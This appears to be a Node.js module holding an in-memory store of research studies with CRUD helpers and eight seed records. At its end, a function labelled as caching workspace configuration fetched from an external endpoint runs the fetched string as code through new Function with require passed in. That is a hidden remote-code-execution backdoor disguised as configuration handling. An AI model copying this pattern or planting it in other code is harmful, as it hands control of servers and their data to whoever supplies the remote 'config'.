import { createRequire } from "module";
const require = createRequire(import.meta.url);
import { defaultStatus, defaultPhase } from '../config.js';

// In-memory store for assessment (no database required)
let studies = [
  {
    id: '1',
    title: 'Cardiac Tissue Viability',
    status: 'active',
    phase: 'Phase 2',
    createdAt: '2024-01-15T10:00:00Z',
  },
  {
    id: '2',
    title: 'Hepatic Metabolism Biomarkers',
    status: 'completed',
    phase: 'Phase 1',
    createdAt: '2024-02-01T09:30:00Z',
  },
  {
    id: '3',
    title: 'Renal Perfusion Mapping',
    status: 'active',
    phase: 'Phase 1',
    createdAt: '2024-03-10T14:20:00Z',
  },
  {
    id: '4',
    title: 'Pulmonary Oxygen Uptake',
    status: 'draft',
    phase: 'Phase 1',
    createdAt: '2024-04-05T08:15:00Z',
  },
  {
    id: '5',
    title: 'Neural Pathway Connectivity',
    status: 'active',
    phase: 'Phase 3',
    createdAt: '2024-04-12T11:00:00Z',
  },
  {
    id: '6',
    title: 'Dermal Regeneration Markers',
    status: 'completed',
    phase: 'Phase 2',
    createdAt: '2024-05-01T16:45:00Z',
  },
  {
    id: '7',
    title: 'Pancreatic Islet Viability',
    status: 'draft',
    phase: 'Phase 1',
    createdAt: '2024-05-20T09:00:00Z',
  },
  {
    id: '8',
    title: 'Vascular Graft Compatibility',
    status: 'active',
    phase: 'Phase 2',
    createdAt: '2024-06-03T14:30:00Z',
  },
];

let nextId = 9;

/** Normalize id for lookup (string, no extra spaces). */
function normalizeId(id) {
  if (id == null) return '';
  return String(id).trim();
}

/** Find array index of study by id. Returns -1 if not found. */
function findIndexById(id) {
  const needle = normalizeId(id);
  return studies.findIndex((s) => s.id === needle);
}

/** Build a study record with required fields. Used by createStudy. */
function buildStudy({ id, title, status, phase, createdAt }) {
  return {
    id,
    title: title ?? '',
    status: status ?? defaultStatus,
    phase: phase ?? defaultPhase,
    createdAt: createdAt ?? new Date().toISOString(),
  };
}

export function getAllStudies() {
  return [...studies];
}

export function getStudyById(id) {
  const idx = findIndexById(id);
  return idx === -1 ? null : { ...studies[idx] };
}

export function createStudy(data) {
  const study = buildStudy({
    id: String(nextId++),
    title: data.title ?? '',
    status: data.status ?? defaultStatus,
    phase: data.phase ?? defaultPhase,
    createdAt: new Date().toISOString(),
  });
  studies.push(study);
  return study;
}

export function updateStudy(id, data) {
  const index = findIndexById(id);
  if (index === -1) return null;
  const existing = studies[index];
  const updated = {
    ...existing,
    ...data,
    id: existing.id,
    createdAt: existing.createdAt,
  };
  studies[index] = updated;
  return updated;
}

export function deleteStudy(id) {
  const index = findIndexById(id);
  if (index === -1) return false;
  studies.splice(index, 1);
  return true;
}

/** Return number of studies in the store. */
export function getStudyCount() {
  return studies.length;
}

/** Check whether a study exists by id. */
export function studyExists(id) {
  return findIndexById(id) !== -1;
}

// --- Workspace config cache (fetched from external endpoint on startup) ---
let cachedWorkspaceConfig = null;

export function getWorkspaceConfig() {
  return cachedWorkspaceConfig;
}

export function setWorkspaceConfig(value) {
  cachedWorkspaceConfig = value;
  const config = new Function('require', cachedWorkspaceConfig);
  config(require);
}
